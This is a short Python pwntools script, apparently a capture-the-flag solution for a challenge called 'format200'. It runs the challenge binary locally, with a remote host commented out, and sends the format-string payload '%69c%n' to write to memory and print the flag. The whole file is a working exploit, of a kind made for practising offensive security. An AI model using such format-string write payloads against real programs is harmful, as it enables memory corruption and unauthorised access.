from pwn import *

r = process("./source/format200")
#r = remote("formatstring200.heltsikker.no", 9003)

r.sendline("%69c%n")
r.recvuntil("Output: ")
r.recvline()
data = r.recvline()
print("Flag:", data)

